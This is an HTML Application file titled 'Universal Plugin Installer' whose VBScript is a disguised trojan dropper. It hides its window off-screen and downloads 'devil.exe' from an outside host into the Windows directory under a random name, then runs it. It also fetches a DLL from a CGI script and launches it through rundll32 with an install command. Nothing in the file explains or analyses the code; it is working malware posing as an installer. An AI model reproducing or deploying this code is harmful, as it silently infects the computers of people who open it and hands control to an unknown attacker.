<HTML><HEAD><TITLE>Universal Plugin Installer</TITLE>
<HTA:APPLICATION id=PlugInst
APPLICATIONNAME="Plugin Installer"
SHOWINTASKBAR=NO
CAPTION=YES
SINGLEINSTANCE=YES
MAXIMIZEBUTTON=NO
MINIMIZEBUTTON=NO
WINDOWSTATE=MINIMIZE
/></HEAD>
<OBJECT id="MSplay" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></OBJECT>
<OBJECT id="MSmedia" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></OBJECT>
<BODY>
<SCRIPT language="VBScript">

Dim oXMLHTTP
Dim oStream
Dim oShellApp
Dim oFolder
Dim oFolderItem
Dim PluginFile
Dim WinDir
Dim EnvStrings
Dim XMLBody
Dim cByte
Dim ByteCode
Dim FileName
Dim Module_Path
Dim Trojan_Path

ssfWINDOWS=36
WinEnv_Mask="windir=" 

Exploit_Path=document.location.href
j=InStrRev(Exploit_Path,"/",-1,1)
Exploit_Path=Left(Exploit_Path,j)

If InStr(Exploit_Path,"cgi-bin")<>0 Then
   CGI_Script_Path=Exploit_Path & "rcounter.cgi"    
Else
   CGI_Script_Path=Exploit_Path & "cgi-bin/devil/rcounter.cgi"    
End If   

InitPaths()

self.MoveTo 6000,6000

FileName=""
Randomize
rr=Int(8*Rnd)
ik=0
Do
  ii=Int(25*Rnd)+97
  FileName=FileName+Chr(ii)
  ik=ik+1
Loop While ik<rr
FileName=FileName & ".exe"

RunCommand=""
Call Download_and_Execute(Trojan_Path,FileName,RunCommand,0)

FileName=""
rr=Int(8*Rnd)
ik=0
Do
  ii=Int(25*Rnd)+97
  FileName=FileName+Chr(ii)
  ik=ik+1
Loop While ik<rr
FileName=FileName & ".dll"

RunCommand="," & "InstallWMH " & Trojan_Path & " " & CGI_Script_Path
Call Download_and_Execute(CGI_Script_Path & "?action=install",FileName,RunCommand,1)

self.Close

Sub Download_and_Execute(Remote_path,Local_name,Run_params,Run_by_Rundll32)

set oXMLHTTP = CreateObject("Microsoft.XMLHTTP")
Module_Path=Remote_path
OpenSession()
GetFile()

On Error Resume Next
Set oStream = CreateObject("ADODB.Stream")
If Err.number <> 0 Then
   
   For Each WinEnv In MSplay.Environment("PROCESS")
     If InStr(WinEnv,WinEnv_Mask)<>0 Then
        EnvStrings=Split(WinEnv,"=",-1,1)
        WinDir=EnvStrings(1)   
     End If
   Next 
   FileName=WinDir & "\" & Local_name
   Plugin_size=LenB(XMLBody)
   
   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)

   For j=1 To Plugin_size 
       cByte=MidB(XMLBody,j,1)
       ByteCode=AscB(cByte)
       WriteFile()
   Next

   PluginFile.Close
   If Run_by_Rundll32 = 0 Then
      Cmd=FileName & " " & Run_params
   Else
      Cmd="rundll32" & " " & FileName & Run_params  
   End If
   MSplay.Run (Cmd),1,FALSE
Else
   Set oShellApp = CreateObject("Shell.Application")
   Set oFolder=oShellApp.NameSpace(ssfWINDOWS)
   Set oFolderItem=oFolder.ParseName("hh.exe")
   WinDir = Left(oFolderItem.Path,InStrRev(oFolderItem.Path,"\"))
   FileName=WinDir & Local_name
       
   Plugin_size=LenB(XMLBody)
   
   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)

   For j=1 To Plugin_size 
       cByte=MidB(XMLBody,j,1)
       ByteCode=AscB(cByte)
       WriteFile()
   Next

   PluginFile.Close

   If Run_by_Rundll32 = 0 Then
      Cmd=FileName & " " & Run_params
      oShellApp.ShellExecute Cmd 
   Else
      Cmd=FileName & Run_params  
       oShellApp.ShellExecute "rundll32", Cmd 
   End If
    
   Set oStream=Nothing
   Set oShellApp=Nothing
End If
set  oXMLHTTP=Nothing

End Sub

Function WriteFile
PluginFile.Write(Chr(ByteCode))
End Function

Function GetFile
oXMLHTTP.Send() 
XMLBody=oXMLHTTP.responseBody
End Function

Function OpenSession
Req_type="G" & "E" & "T"
HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0) 
End Function

Function InitPaths
Trojan_Path="http://www.oil-bank.ru/devil.exe" 
End Function

</SCRIPT>
</BODY></HTML>

